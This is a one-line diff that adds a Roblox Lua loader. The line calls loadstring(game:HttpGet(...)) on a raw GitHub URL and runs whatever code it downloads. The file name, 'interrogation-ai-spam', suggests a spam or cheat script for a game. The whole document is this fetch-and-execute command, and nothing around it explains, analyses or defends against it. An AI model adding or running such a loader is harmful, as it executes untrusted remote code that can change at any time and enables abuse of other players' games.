@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/interrogation-ai-spam1-2gwbnipngz0kqu.lua"))()
